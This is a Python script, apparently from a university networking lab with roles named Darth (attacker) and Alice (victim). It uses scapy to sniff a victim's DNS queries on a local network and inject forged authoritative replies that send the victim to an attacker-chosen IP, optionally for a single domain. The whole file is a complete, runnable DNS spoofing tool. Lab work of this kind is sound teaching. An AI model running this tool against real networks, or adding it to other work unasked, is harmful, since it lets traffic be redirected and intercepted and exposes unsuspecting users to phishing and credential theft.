"""
dns_spoof.py — run on Darth (attacker)

Sniffs DNS queries from the victim and injects forged replies before
the legitimate DNS server answers. Relies on being on the same LAN
(or having ARP poisoning active) to see the queries.

Usage:
    sudo python3 dns_spoof.py
    sudo python3 dns_spoof.py --victim-ip 10.0.0.10 --spoof-ip 10.0.0.30
    sudo python3 dns_spoof.py --domain unical.it   # spoof only one domain
"""

from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    Ether,
    IP,
    UDP,
    conf,
    get_if_hwaddr,
    sendp,
    sniff,
)
import typer
from rich.console import Console
from typing import Optional

console = Console()


def main(
    victim_ip: str = typer.Option("10.0.0.10", help="Victim's IP (Alice)"),
    spoof_ip: str = typer.Option("10.0.0.30", help="IP to return for spoofed queries"),
    iface: str = typer.Option("eth0", help="Network interface to sniff"),
    domain: Optional[str] = typer.Option(
        None, help="Spoof only this domain (default: all)"
    ),
):
    console.print(f"[red]DNS Spoofing started[/red]")
    console.print(f"  Victim:  [yellow]{victim_ip}[/yellow]")
    console.print(f"  Replies: all queries → [cyan]{spoof_ip}[/cyan]")
    if domain:
        console.print(f"  Filter:  only [magenta]{domain}[/magenta]")
    console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    def handle(pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return

        qname = pkt[DNS].qd.qname.decode().rstrip(".")

        if domain and qname != domain and not qname.endswith("." + domain):
            return

        console.print(
            f"  Query: [cyan]{qname}[/cyan] (id={pkt[DNS].id}) → replying with [red]{spoof_ip}[/red]"
        )

        reply = (
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
            / IP(src=pkt[IP].dst, dst=pkt[IP].src)
            / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            / DNS(
                id=pkt[
                    DNS
                ].id,  # must match the query — client discards mismatches silently
                qr=1,  # 1 = reply
                aa=1,  # authoritative answer
                qd=pkt[DNS].qd,  # echo the question section
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=60,
                    rdata=spoof_ip,
                ),
            )
        )
        sendp(reply, iface=iface, verbose=0)

    sniff(
        iface=iface,
        filter=f"udp and port 53 and src host {victim_ip}",
        prn=handle,
        store=0,
    )


if __name__ == "__main__":
    typer.run(main)
